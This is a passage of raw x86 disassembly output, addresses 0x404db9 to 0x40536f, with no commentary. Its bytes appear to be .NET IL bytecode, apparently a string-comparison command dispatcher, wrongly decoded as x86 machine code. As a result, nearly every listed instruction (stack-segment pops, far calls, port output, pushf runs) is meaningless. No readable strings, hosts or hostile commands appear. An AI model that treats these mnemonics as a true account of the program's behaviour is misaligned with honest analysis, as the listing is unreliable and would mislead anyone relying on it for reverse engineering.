  404db9:	11 26                	adc    %esp,(%esi)
  404dbb:	17                   	pop    %ss
  404dbc:	90                   	nop
  404dbd:	2c 22                	sub    $0x22,%al
  404dbf:	11 24 17             	adc    %esp,(%edi,%edx,1)
  404dc2:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404dc9:	28 00                	sub    %al,(%eax)
  404dcb:	00 01                	add    %al,(%ecx)
  404dcd:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404dd0:	00 0a                	add    %cl,(%edx)
  404dd2:	28 6d 00             	sub    %ch,0x0(%ebp)
  404dd5:	00 0a                	add    %cl,(%edx)
  404dd7:	74 28                	je     0x404e01
  404dd9:	00 00                	add    %al,(%eax)
  404ddb:	01 80 07 00 00 04    	add    %eax,0x4000007(%eax)
  404de1:	11 26                	adc    %esp,(%esi)
  404de3:	18 90 2c 22 11 24    	sbb    %dl,0x2411222c(%eax)
  404de9:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  404def:	0a d0                	or     %al,%dl
  404df1:	28 00                	sub    %al,(%eax)
  404df3:	00 01                	add    %al,(%ecx)
  404df5:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404df8:	00 0a                	add    %cl,(%edx)
  404dfa:	28 6d 00             	sub    %ch,0x0(%ebp)
  404dfd:	00 0a                	add    %cl,(%edx)
  404dff:	74 28                	je     0x404e29
  404e01:	00 00                	add    %al,(%eax)
  404e03:	01 80 09 00 00 04    	add    %eax,0x4000009(%eax)
  404e09:	11 26                	adc    %esp,(%esi)
  404e0b:	19 90 2c 22 11 24    	sbb    %edx,0x2411222c(%eax)
  404e11:	19 9a 28 11 00 00    	sbb    %ebx,0x1128(%edx)
  404e17:	0a d0                	or     %al,%dl
  404e19:	28 00                	sub    %al,(%eax)
  404e1b:	00 01                	add    %al,(%ecx)
  404e1d:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404e20:	00 0a                	add    %cl,(%edx)
  404e22:	28 6d 00             	sub    %ch,0x0(%ebp)
  404e25:	00 0a                	add    %cl,(%edx)
  404e27:	74 28                	je     0x404e51
  404e29:	00 00                	add    %al,(%eax)
  404e2b:	01 80 08 00 00 04    	add    %eax,0x4000008(%eax)
  404e31:	38 72 0f             	cmp    %dh,0xf(%edx)
  404e34:	00 00                	add    %al,(%eax)
  404e36:	11 23                	adc    %esp,(%ebx)
  404e38:	72 fb                	jb     0x404e35
  404e3a:	07                   	pop    %es
  404e3b:	00 70 16             	add    %dh,0x16(%eax)
  404e3e:	28 69 00             	sub    %ch,0x0(%ecx)
  404e41:	00 0a                	add    %cl,(%edx)
  404e43:	16                   	push   %ss
  404e44:	40                   	inc    %eax
  404e45:	1f                   	pop    %ds
  404e46:	01 00                	add    %eax,(%eax)
  404e48:	00 06                	add    %al,(%esi)
  404e4a:	7b 28                	jnp    0x404e74
  404e4c:	00 00                	add    %al,(%eax)
  404e4e:	04 17                	add    $0x17,%al
  404e50:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  404e57:	72 9b                	jb     0x404df4
  404e59:	07                   	pop    %es
  404e5a:	00 70 1b             	add    %dh,0x1b(%eax)
  404e5d:	8d 03                	lea    (%ebx),%eax
  404e5f:	00 00                	add    %al,(%eax)
  404e61:	01 13                	add    %edx,(%ebx)
  404e63:	25 11 25 16 7e       	and    $0x7e162511,%eax
  404e68:	06                   	push   %es
  404e69:	00 00                	add    %al,(%eax)
  404e6b:	04 a2                	add    $0xa2,%al
  404e6d:	11 25 17 7e 07 00    	adc    %esp,0x77e17
  404e73:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404e76:	11 25 18 7e 09 00    	adc    %esp,0x97e18
  404e7c:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404e7f:	11 25 19 7e 08 00    	adc    %esp,0x87e19
  404e85:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404e88:	11 25 1a 28 38 00    	adc    %esp,0x38281a
  404e8e:	00 06                	add    %al,(%esi)
  404e90:	a2 11 25 13 24       	mov    %al,0x24132511
  404e95:	11 24 14             	adc    %esp,(%esp,%edx,1)
  404e98:	14 1b                	adc    $0x1b,%al
  404e9a:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  404e9d:	00 01                	add    %al,(%ecx)
  404e9f:	13 26                	adc    (%esi),%esp
  404ea1:	11 26                	adc    %esp,(%esi)
  404ea3:	16                   	push   %ss
  404ea4:	17                   	pop    %ss
  404ea5:	9c                   	pushf
  404ea6:	11 26                	adc    %esp,(%esi)
  404ea8:	17                   	pop    %ss
  404ea9:	17                   	pop    %ss
  404eaa:	9c                   	pushf
  404eab:	11 26                	adc    %esp,(%esi)
  404ead:	18 17                	sbb    %dl,(%edi)
  404eaf:	9c                   	pushf
  404eb0:	11 26                	adc    %esp,(%esi)
  404eb2:	19 17                	sbb    %edx,(%edi)
  404eb4:	9c                   	pushf
  404eb5:	11 26                	adc    %esp,(%esi)
  404eb7:	1a 16                	sbb    (%esi),%dl
  404eb9:	9c                   	pushf
  404eba:	11 26                	adc    %esp,(%esi)
  404ebc:	17                   	pop    %ss
  404ebd:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404ec1:	0a 26                	or     (%esi),%ah
  404ec3:	11 26                	adc    %esp,(%esi)
  404ec5:	16                   	push   %ss
  404ec6:	90                   	nop
  404ec7:	2c 22                	sub    $0x22,%al
  404ec9:	11 24 16             	adc    %esp,(%esi,%edx,1)
  404ecc:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404ed3:	28 00                	sub    %al,(%eax)
  404ed5:	00 01                	add    %al,(%ecx)
  404ed7:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404eda:	00 0a                	add    %cl,(%edx)
  404edc:	28 6d 00             	sub    %ch,0x0(%ebp)
  404edf:	00 0a                	add    %cl,(%edx)
  404ee1:	74 28                	je     0x404f0b
  404ee3:	00 00                	add    %al,(%eax)
  404ee5:	01 80 06 00 00 04    	add    %eax,0x4000006(%eax)
  404eeb:	11 26                	adc    %esp,(%esi)
  404eed:	17                   	pop    %ss
  404eee:	90                   	nop
  404eef:	2c 22                	sub    $0x22,%al
  404ef1:	11 24 17             	adc    %esp,(%edi,%edx,1)
  404ef4:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  404efb:	28 00                	sub    %al,(%eax)
  404efd:	00 01                	add    %al,(%ecx)
  404eff:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404f02:	00 0a                	add    %cl,(%edx)
  404f04:	28 6d 00             	sub    %ch,0x0(%ebp)
  404f07:	00 0a                	add    %cl,(%edx)
  404f09:	74 28                	je     0x404f33
  404f0b:	00 00                	add    %al,(%eax)
  404f0d:	01 80 07 00 00 04    	add    %eax,0x4000007(%eax)
  404f13:	11 26                	adc    %esp,(%esi)
  404f15:	18 90 2c 22 11 24    	sbb    %dl,0x2411222c(%eax)
  404f1b:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  404f21:	0a d0                	or     %al,%dl
  404f23:	28 00                	sub    %al,(%eax)
  404f25:	00 01                	add    %al,(%ecx)
  404f27:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404f2a:	00 0a                	add    %cl,(%edx)
  404f2c:	28 6d 00             	sub    %ch,0x0(%ebp)
  404f2f:	00 0a                	add    %cl,(%edx)
  404f31:	74 28                	je     0x404f5b
  404f33:	00 00                	add    %al,(%eax)
  404f35:	01 80 09 00 00 04    	add    %eax,0x4000009(%eax)
  404f3b:	11 26                	adc    %esp,(%esi)
  404f3d:	19 90 2c 22 11 24    	sbb    %edx,0x2411222c(%eax)
  404f43:	19 9a 28 11 00 00    	sbb    %ebx,0x1128(%edx)
  404f49:	0a d0                	or     %al,%dl
  404f4b:	28 00                	sub    %al,(%eax)
  404f4d:	00 01                	add    %al,(%ecx)
  404f4f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  404f52:	00 0a                	add    %cl,(%edx)
  404f54:	28 6d 00             	sub    %ch,0x0(%ebp)
  404f57:	00 0a                	add    %cl,(%edx)
  404f59:	74 28                	je     0x404f83
  404f5b:	00 00                	add    %al,(%eax)
  404f5d:	01 80 08 00 00 04    	add    %eax,0x4000008(%eax)
  404f63:	38 40 0e             	cmp    %al,0xe(%eax)
  404f66:	00 00                	add    %al,(%eax)
  404f68:	11 23                	adc    %esp,(%ebx)
  404f6a:	72 0b                	jb     0x404f77
  404f6c:	08 00                	or     %al,(%eax)
  404f6e:	70 16                	jo     0x404f86
  404f70:	28 69 00             	sub    %ch,0x0(%ecx)
  404f73:	00 0a                	add    %cl,(%edx)
  404f75:	16                   	push   %ss
  404f76:	33 41 7e             	xor    0x7e(%ecx),%eax
  404f79:	21 00                	and    %eax,(%eax)
  404f7b:	00 04 6f             	add    %al,(%edi,%ebp,2)
  404f7e:	81 00 00 0a de 0f    	addl   $0xfde0a00,(%eax)
  404f84:	25 28 29 00 00       	and    $0x2928,%eax
  404f89:	0a 13                	or     (%ebx),%dl
  404f8b:	1c 28                	sbb    $0x28,%al
  404f8d:	2a 00                	sub    (%eax),%al
  404f8f:	00 0a                	add    %cl,(%edx)
  404f91:	de 00                	fiadds (%eax)
  404f93:	06                   	push   %es
  404f94:	25 fe 07 56 00       	and    $0x5607fe,%eax
  404f99:	00 06                	add    %al,(%esi)
  404f9b:	73 2b                	jae    0x404fc8
  404f9d:	00 00                	add    %al,(%eax)
  404f9f:	0a 73 2c             	or     0x2c(%ebx),%dh
  404fa2:	00 00                	add    %al,(%eax)
  404fa4:	0a 80 21 00 00 04    	or     0x4000021(%eax),%al
  404faa:	7e 21                	jle    0x404fcd
  404fac:	00 00                	add    %al,(%eax)
  404fae:	04 6f                	add    $0x6f,%al
  404fb0:	2d 00 00 0a 38       	sub    $0x380a0000,%eax
  404fb5:	ef                   	out    %eax,(%dx)
  404fb6:	0d 00 00 11 23       	or     $0x23110000,%eax
  404fbb:	72 11                	jb     0x404fce
  404fbd:	08 00                	or     %al,(%eax)
  404fbf:	70 16                	jo     0x404fd7
  404fc1:	28 69 00             	sub    %ch,0x0(%ecx)
  404fc4:	00 0a                	add    %cl,(%edx)
  404fc6:	16                   	push   %ss
  404fc7:	33 20                	xor    (%eax),%esp
  404fc9:	7e 21                	jle    0x404fec
  404fcb:	00 00                	add    %al,(%eax)
  404fcd:	04 6f                	add    $0x6f,%al
  404fcf:	81 00 00 0a de 0f    	addl   $0xfde0a00,(%eax)
  404fd5:	25 28 29 00 00       	and    $0x2928,%eax
  404fda:	0a 13                	or     (%ebx),%dl
  404fdc:	1d 28 2a 00 00       	sbb    $0x2a28,%eax
  404fe1:	0a de                	or     %dh,%bl
  404fe3:	00 38                	add    %bh,(%eax)
  404fe5:	bf 0d 00 00 11       	mov    $0x1100000d,%edi
  404fea:	23 72 21             	and    0x21(%edx),%esi
  404fed:	08 00                	or     %al,(%eax)
  404fef:	70 16                	jo     0x405007
  404ff1:	28 69 00             	sub    %ch,0x0(%ecx)
  404ff4:	00 0a                	add    %cl,(%edx)
  404ff6:	16                   	push   %ss
  404ff7:	33 28                	xor    (%eax),%ebp
  404ff9:	72 21                	jb     0x40501c
  404ffb:	08 00                	or     %al,(%eax)
  404ffd:	70 7e                	jo     0x40507d
  404fff:	19 00                	sbb    %eax,(%eax)
  405001:	00 04 28             	add    %al,(%eax,%ebp,1)
  405004:	66 00 00             	data16 add %al,(%eax)
  405007:	0a 28                	or     (%eax),%ch
  405009:	38 00                	cmp    %al,(%eax)
  40500b:	00 06                	add    %al,(%esi)
  40500d:	28 66 00             	sub    %ah,0x0(%esi)
  405010:	00 0a                	add    %cl,(%edx)
  405012:	28 3b                	sub    %bh,(%ebx)
  405014:	00 00                	add    %al,(%eax)
  405016:	0a 28                	or     (%eax),%ch
  405018:	1c 00                	sbb    $0x0,%al
  40501a:	00 06                	add    %al,(%esi)
  40501c:	38 87 0d 00 00 11    	cmp    %al,0x1100000d(%edi)
  405022:	23 72 2d             	and    0x2d(%edx),%esi
  405025:	08 00                	or     %al,(%eax)
  405027:	70 16                	jo     0x40503f
  405029:	28 69 00             	sub    %ch,0x0(%ecx)
  40502c:	00 0a                	add    %cl,(%edx)
  40502e:	16                   	push   %ss
  40502f:	33 51 72             	xor    0x72(%ecx),%edx
  405032:	2d 08 00 70 7e       	sub    $0x7e700008,%eax
  405037:	19 00                	sbb    %eax,(%eax)
  405039:	00 04 28             	add    %al,(%eax,%ebp,1)
  40503c:	71 00                	jno    0x40503e
  40503e:	00 0a                	add    %cl,(%edx)
  405040:	72 39                	jb     0x40507b
  405042:	08 00                	or     %al,(%eax)
  405044:	70 28                	jo     0x40506e
  405046:	38 00                	cmp    %al,(%eax)
  405048:	00 06                	add    %al,(%esi)
  40504a:	28 47 00             	sub    %al,0x0(%edi)
  40504d:	00 0a                	add    %cl,(%edx)
  40504f:	72 0b                	jb     0x40505c
  405051:	08 00                	or     %al,(%eax)
  405053:	70 14                	jo     0x405069
  405055:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  40505b:	71 00                	jno    0x40505d
  40505d:	00 0a                	add    %cl,(%edx)
  40505f:	7e 19                	jle    0x40507a
  405061:	00 00                	add    %al,(%eax)
  405063:	04 28                	add    $0x28,%al
  405065:	71 00                	jno    0x405067
  405067:	00 0a                	add    %cl,(%edx)
  405069:	28 38                	sub    %bh,(%eax)
  40506b:	00 00                	add    %al,(%eax)
  40506d:	06                   	push   %es
  40506e:	28 71 00             	sub    %dh,0x0(%ecx)
  405071:	00 0a                	add    %cl,(%edx)
  405073:	28 3b                	sub    %bh,(%ebx)
  405075:	00 00                	add    %al,(%eax)
  405077:	0a 28                	or     (%eax),%ch
  405079:	1c 00                	sbb    $0x0,%al
  40507b:	00 06                	add    %al,(%esi)
  40507d:	38 26                	cmp    %ah,(%esi)
  40507f:	0d 00 00 11 23       	or     $0x23110000,%eax
  405084:	72 71                	jb     0x4050f7
  405086:	08 00                	or     %al,(%eax)
  405088:	70 16                	jo     0x4050a0
  40508a:	28 69 00             	sub    %ch,0x0(%ecx)
  40508d:	00 0a                	add    %cl,(%edx)
  40508f:	16                   	push   %ss
  405090:	33 28                	xor    (%eax),%ebp
  405092:	72 71                	jb     0x405105
  405094:	08 00                	or     %al,(%eax)
  405096:	70 7e                	jo     0x405116
  405098:	19 00                	sbb    %eax,(%eax)
  40509a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40509d:	66 00 00             	data16 add %al,(%eax)
  4050a0:	0a 28                	or     (%eax),%ch
  4050a2:	38 00                	cmp    %al,(%eax)
  4050a4:	00 06                	add    %al,(%esi)
  4050a6:	28 66 00             	sub    %ah,0x0(%esi)
  4050a9:	00 0a                	add    %cl,(%edx)
  4050ab:	28 3b                	sub    %bh,(%ebx)
  4050ad:	00 00                	add    %al,(%eax)
  4050af:	0a 28                	or     (%eax),%ch
  4050b1:	1c 00                	sbb    $0x0,%al
  4050b3:	00 06                	add    %al,(%esi)
  4050b5:	38 ee                	cmp    %ch,%dh
  4050b7:	0c 00                	or     $0x0,%al
  4050b9:	00 11                	add    %dl,(%ecx)
  4050bb:	23 72 7b             	and    0x7b(%edx),%esi
  4050be:	08 00                	or     %al,(%eax)
  4050c0:	70 16                	jo     0x4050d8
  4050c2:	28 69 00             	sub    %ch,0x0(%ecx)
  4050c5:	00 0a                	add    %cl,(%edx)
  4050c7:	16                   	push   %ss
  4050c8:	40                   	inc    %eax
  4050c9:	c8 00 00 00          	enter  $0x0,$0x0
  4050cd:	72 7b                	jb     0x40514a
  4050cf:	08 00                	or     %al,(%eax)
  4050d1:	70 7e                	jo     0x405151
  4050d3:	19 00                	sbb    %eax,(%eax)
  4050d5:	00 04 28             	add    %al,(%eax,%ebp,1)
  4050d8:	71 00                	jno    0x4050da
  4050da:	00 0a                	add    %cl,(%edx)
  4050dc:	06                   	push   %es
  4050dd:	7b 28                	jnp    0x405107
  4050df:	00 00                	add    %al,(%eax)
  4050e1:	04 17                	add    $0x17,%al
  4050e3:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4050ea:	72 85                	jb     0x405071
  4050ec:	08 00                	or     %al,(%eax)
  4050ee:	70 17                	jo     0x405107
  4050f0:	8d 03                	lea    (%ebx),%eax
  4050f2:	00 00                	add    %al,(%eax)
  4050f4:	01 13                	add    %edx,(%ebx)
  4050f6:	25 11 25 16 06       	and    $0x6162511,%eax
  4050fb:	7b 28                	jnp    0x405125
  4050fd:	00 00                	add    %al,(%eax)
  4050ff:	04 13                	add    $0x13,%al
  405101:	29 11                	sub    %edx,(%ecx)
  405103:	29 18                	sub    %ebx,(%eax)
  405105:	13 2a                	adc    (%edx),%ebp
  405107:	11 2a                	adc    %ebp,(%edx)
  405109:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  405110:	24 14                	and    $0x14,%al
  405112:	14 17                	adc    $0x17,%al
  405114:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  405117:	00 01                	add    %al,(%ecx)
  405119:	13 26                	adc    (%esi),%esp
  40511b:	11 26                	adc    %esp,(%esi)
  40511d:	16                   	push   %ss
  40511e:	17                   	pop    %ss
  40511f:	9c                   	pushf
  405120:	11 26                	adc    %esp,(%esi)
  405122:	28 72 00             	sub    %dh,0x0(%edx)
  405125:	00 0a                	add    %cl,(%edx)
  405127:	11 26                	adc    %esp,(%esi)
  405129:	16                   	push   %ss
  40512a:	90                   	nop
  40512b:	2c 22                	sub    $0x22,%al
  40512d:	11 29                	adc    %ebp,(%ecx)
  40512f:	11 2a                	adc    %ebp,(%edx)
  405131:	11 24 16             	adc    %esp,(%esi,%edx,1)
  405134:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40513b:	28 00                	sub    %al,(%eax)
  40513d:	00 01                	add    %al,(%ecx)
  40513f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405142:	00 0a                	add    %cl,(%edx)
  405144:	28 6d 00             	sub    %ch,0x0(%ebp)
  405147:	00 0a                	add    %cl,(%edx)
  405149:	74 28                	je     0x405173
  40514b:	00 00                	add    %al,(%eax)
  40514d:	01 a2 28 71 00 00    	add    %esp,0x7128(%edx)
  405153:	0a 7e 19             	or     0x19(%esi),%bh
  405156:	00 00                	add    %al,(%eax)
  405158:	04 28                	add    $0x28,%al
  40515a:	71 00                	jno    0x40515c
  40515c:	00 0a                	add    %cl,(%edx)
  40515e:	28 1d 00 00 0a 6f    	sub    %bl,0x6f0a0000
  405164:	8e 00                	mov    (%eax),%es
  405166:	00 0a                	add    %cl,(%edx)
  405168:	8c 5a 00             	mov    %ds,0x0(%edx)
  40516b:	00 01                	add    %al,(%ecx)
  40516d:	28 71 00             	sub    %dh,0x0(%ecx)
  405170:	00 0a                	add    %cl,(%edx)
  405172:	7e 19                	jle    0x40518d
  405174:	00 00                	add    %al,(%eax)
  405176:	04 28                	add    $0x28,%al
  405178:	71 00                	jno    0x40517a
  40517a:	00 0a                	add    %cl,(%edx)
  40517c:	28 38                	sub    %bh,(%eax)
  40517e:	00 00                	add    %al,(%eax)
  405180:	06                   	push   %es
  405181:	28 71 00             	sub    %dh,0x0(%ecx)
  405184:	00 0a                	add    %cl,(%edx)
  405186:	28 3b                	sub    %bh,(%ebx)
  405188:	00 00                	add    %al,(%eax)
  40518a:	0a 28                	or     (%eax),%ch
  40518c:	1c 00                	sbb    $0x0,%al
  40518e:	00 06                	add    %al,(%esi)
  405190:	38 13                	cmp    %dl,(%ebx)
  405192:	0c 00                	or     $0x0,%al
  405194:	00 11                	add    %dl,(%ecx)
  405196:	23 72 93             	and    -0x6d(%edx),%esi
  405199:	08 00                	or     %al,(%eax)
  40519b:	70 16                	jo     0x4051b3
  40519d:	28 69 00             	sub    %ch,0x0(%ecx)
  4051a0:	00 0a                	add    %cl,(%edx)
  4051a2:	16                   	push   %ss
  4051a3:	33 28                	xor    (%eax),%ebp
  4051a5:	72 93                	jb     0x40513a
  4051a7:	08 00                	or     %al,(%eax)
  4051a9:	70 7e                	jo     0x405229
  4051ab:	19 00                	sbb    %eax,(%eax)
  4051ad:	00 04 28             	add    %al,(%eax,%ebp,1)
  4051b0:	66 00 00             	data16 add %al,(%eax)
  4051b3:	0a 28                	or     (%eax),%ch
  4051b5:	38 00                	cmp    %al,(%eax)
  4051b7:	00 06                	add    %al,(%esi)
  4051b9:	28 66 00             	sub    %ah,0x0(%esi)
  4051bc:	00 0a                	add    %cl,(%edx)
  4051be:	28 3b                	sub    %bh,(%ebx)
  4051c0:	00 00                	add    %al,(%eax)
  4051c2:	0a 28                	or     (%eax),%ch
  4051c4:	1c 00                	sbb    $0x0,%al
  4051c6:	00 06                	add    %al,(%esi)
  4051c8:	38 db                	cmp    %bl,%bl
  4051ca:	0b 00                	or     (%eax),%eax
  4051cc:	00 11                	add    %dl,(%ecx)
  4051ce:	23 72 9b             	and    -0x65(%edx),%esi
  4051d1:	08 00                	or     %al,(%eax)
  4051d3:	70 16                	jo     0x4051eb
  4051d5:	28 69 00             	sub    %ch,0x0(%ecx)
  4051d8:	00 0a                	add    %cl,(%edx)
  4051da:	16                   	push   %ss
  4051db:	40                   	inc    %eax
  4051dc:	d4 00                	aam    $0x0
  4051de:	00 00                	add    %al,(%eax)
  4051e0:	06                   	push   %es
  4051e1:	7b 28                	jnp    0x40520b
  4051e3:	00 00                	add    %al,(%eax)
  4051e5:	04 17                	add    $0x17,%al
  4051e7:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4051ee:	72 a5                	jb     0x405195
  4051f0:	08 00                	or     %al,(%eax)
  4051f2:	70 16                	jo     0x40520a
  4051f4:	8d 03                	lea    (%ebx),%eax
  4051f6:	00 00                	add    %al,(%eax)
  4051f8:	01 14 14             	add    %edx,(%esp,%edx,1)
  4051fb:	14 28                	adc    $0x28,%al
  4051fd:	72 00                	jb     0x4051ff
  4051ff:	00 0a                	add    %cl,(%edx)
  405201:	28 11                	sub    %dl,(%ecx)
  405203:	00 00                	add    %al,(%eax)
  405205:	0a 13                	or     (%ebx),%dl
  405207:	1e                   	push   %ds
  405208:	11 1e                	adc    %ebx,(%esi)
  40520a:	74 68                	je     0x405274
  40520c:	00 00                	add    %al,(%eax)
  40520e:	01 6f bc             	add    %ebp,-0x44(%edi)
  405211:	00 00                	add    %al,(%eax)
  405213:	0a 13                	or     (%ebx),%dl
  405215:	39 2b                	cmp    %ebp,(%ebx)
  405217:	53                   	push   %ebx
  405218:	11 39                	adc    %edi,(%ecx)
  40521a:	6f                   	outsl  %ds:(%esi),(%dx)
  40521b:	bd 00 00 0a 28       	mov    $0x280a0000,%ebp
  405220:	3b 00                	cmp    (%eax),%eax
  405222:	00 0a                	add    %cl,(%edx)
  405224:	13 1f                	adc    (%edi),%ebx
  405226:	72 9b                	jb     0x4051c3
  405228:	08 00                	or     %al,(%eax)
  40522a:	70 7e                	jo     0x4052aa
  40522c:	19 00                	sbb    %eax,(%eax)
  40522e:	00 04 28             	add    %al,(%eax,%ebp,1)
  405231:	66 00 00             	data16 add %al,(%eax)
  405234:	0a 28                	or     (%eax),%ch
  405236:	38 00                	cmp    %al,(%eax)
  405238:	00 06                	add    %al,(%esi)
  40523a:	28 66 00             	sub    %ah,0x0(%esi)
  40523d:	00 0a                	add    %cl,(%edx)
  40523f:	7e 19                	jle    0x40525a
  405241:	00 00                	add    %al,(%eax)
  405243:	04 28                	add    $0x28,%al
  405245:	71 00                	jno    0x405247
  405247:	00 0a                	add    %cl,(%edx)
  405249:	11 1f                	adc    %ebx,(%edi)
  40524b:	28 71 00             	sub    %dh,0x0(%ecx)
  40524e:	00 0a                	add    %cl,(%edx)
  405250:	28 3b                	sub    %bh,(%ebx)
  405252:	00 00                	add    %al,(%eax)
  405254:	0a 28                	or     (%eax),%ch
  405256:	1c 00                	sbb    $0x0,%al
  405258:	00 06                	add    %al,(%esi)
  40525a:	de 0f                	fimuls (%edi)
  40525c:	25 28 29 00 00       	and    $0x2928,%eax
  405261:	0a 13                	or     (%ebx),%dl
  405263:	20 28                	and    %ch,(%eax)
  405265:	2a 00                	sub    (%eax),%al
  405267:	00 0a                	add    %cl,(%edx)
  405269:	de 00                	fiadds (%eax)
  40526b:	11 39                	adc    %edi,(%ecx)
  40526d:	6f                   	outsl  %ds:(%esi),(%dx)
  40526e:	be 00 00 0a 2d       	mov    $0x2d0a0000,%esi
  405273:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405274:	de 16                	ficoms (%esi)
  405276:	11 39                	adc    %edi,(%ecx)
  405278:	75 43                	jne    0x4052bd
  40527a:	00 00                	add    %al,(%eax)
  40527c:	01 2c 0c             	add    %ebp,(%esp,%ecx,1)
  40527f:	11 39                	adc    %edi,(%ecx)
  405281:	75 43                	jne    0x4052c6
  405283:	00 00                	add    %al,(%eax)
  405285:	01 6f 59             	add    %ebp,0x59(%edi)
  405288:	00 00                	add    %al,(%eax)
  40528a:	0a dc                	or     %ah,%bl
  40528c:	72 c7                	jb     0x405255
  40528e:	08 00                	or     %al,(%eax)
  405290:	70 7e                	jo     0x405310
  405292:	19 00                	sbb    %eax,(%eax)
  405294:	00 04 28             	add    %al,(%eax,%ebp,1)
  405297:	66 00 00             	data16 add %al,(%eax)
  40529a:	0a 28                	or     (%eax),%ch
  40529c:	38 00                	cmp    %al,(%eax)
  40529e:	00 06                	add    %al,(%esi)
  4052a0:	28 66 00             	sub    %ah,0x0(%esi)
  4052a3:	00 0a                	add    %cl,(%edx)
  4052a5:	28 3b                	sub    %bh,(%ebx)
  4052a7:	00 00                	add    %al,(%eax)
  4052a9:	0a 28                	or     (%eax),%ch
  4052ab:	1c 00                	sbb    $0x0,%al
  4052ad:	00 06                	add    %al,(%esi)
  4052af:	38 f4                	cmp    %dh,%ah
  4052b1:	0a 00                	or     (%eax),%al
  4052b3:	00 11                	add    %dl,(%ecx)
  4052b5:	23 72 d1             	and    -0x2f(%edx),%esi
  4052b8:	08 00                	or     %al,(%eax)
  4052ba:	70 16                	jo     0x4052d2
  4052bc:	28 69 00             	sub    %ch,0x0(%ecx)
  4052bf:	00 0a                	add    %cl,(%edx)
  4052c1:	16                   	push   %ss
  4052c2:	40                   	inc    %eax
  4052c3:	9d                   	popf
  4052c4:	00 00                	add    %al,(%eax)
  4052c6:	00 06                	add    %al,(%esi)
  4052c8:	7b 28                	jnp    0x4052f2
  4052ca:	00 00                	add    %al,(%eax)
  4052cc:	04 17                	add    $0x17,%al
  4052ce:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4052d5:	72 e1                	jb     0x4052b8
  4052d7:	08 00                	or     %al,(%eax)
  4052d9:	70 17                	jo     0x4052f2
  4052db:	8d 03                	lea    (%ebx),%eax
  4052dd:	00 00                	add    %al,(%eax)
  4052df:	01 13                	add    %edx,(%ebx)
  4052e1:	25 11 25 16 06       	and    $0x6162511,%eax
  4052e6:	7b 28                	jnp    0x405310
  4052e8:	00 00                	add    %al,(%eax)
  4052ea:	04 13                	add    $0x13,%al
  4052ec:	29 11                	sub    %edx,(%ecx)
  4052ee:	29 18                	sub    %ebx,(%eax)
  4052f0:	13 2a                	adc    (%edx),%ebp
  4052f2:	11 2a                	adc    %ebp,(%edx)
  4052f4:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  4052fb:	24 14                	and    $0x14,%al
  4052fd:	14 17                	adc    $0x17,%al
  4052ff:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  405302:	00 01                	add    %al,(%ecx)
  405304:	13 26                	adc    (%esi),%esp
  405306:	11 26                	adc    %esp,(%esi)
  405308:	16                   	push   %ss
  405309:	17                   	pop    %ss
  40530a:	9c                   	pushf
  40530b:	11 26                	adc    %esp,(%esi)
  40530d:	17                   	pop    %ss
  40530e:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405312:	0a 26                	or     (%esi),%ah
  405314:	11 26                	adc    %esp,(%esi)
  405316:	16                   	push   %ss
  405317:	90                   	nop
  405318:	2c 22                	sub    $0x22,%al
  40531a:	11 29                	adc    %ebp,(%ecx)
  40531c:	11 2a                	adc    %ebp,(%edx)
  40531e:	11 24 16             	adc    %esp,(%esi,%edx,1)
  405321:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  405328:	28 00                	sub    %al,(%eax)
  40532a:	00 01                	add    %al,(%ecx)
  40532c:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40532f:	00 0a                	add    %cl,(%edx)
  405331:	28 6d 00             	sub    %ch,0x0(%ebp)
  405334:	00 0a                	add    %cl,(%edx)
  405336:	74 28                	je     0x405360
  405338:	00 00                	add    %al,(%eax)
  40533a:	01 a2 72 eb 08 00    	add    %esp,0x8eb72(%edx)
  405340:	70 7e                	jo     0x4053c0
  405342:	19 00                	sbb    %eax,(%eax)
  405344:	00 04 28             	add    %al,(%eax,%ebp,1)
  405347:	66 00 00             	data16 add %al,(%eax)
  40534a:	0a 28                	or     (%eax),%ch
  40534c:	38 00                	cmp    %al,(%eax)
  40534e:	00 06                	add    %al,(%esi)
  405350:	28 66 00             	sub    %ah,0x0(%esi)
  405353:	00 0a                	add    %cl,(%edx)
  405355:	28 3b                	sub    %bh,(%ebx)
  405357:	00 00                	add    %al,(%eax)
  405359:	0a 28                	or     (%eax),%ch
  40535b:	1c 00                	sbb    $0x0,%al
  40535d:	00 06                	add    %al,(%esi)
  40535f:	38 44 0a 00          	cmp    %al,0x0(%edx,%ecx,1)
  405363:	00 11                	add    %dl,(%ecx)
  405365:	23 72 f3             	and    -0xd(%edx),%esi
  405368:	08 00                	or     %al,(%eax)
  40536a:	70 16                	jo     0x405382
  40536c:	28 69 00             	sub    %ch,0x0(%ecx)
  40536f:	00 0a                	add    %cl,(%edx)
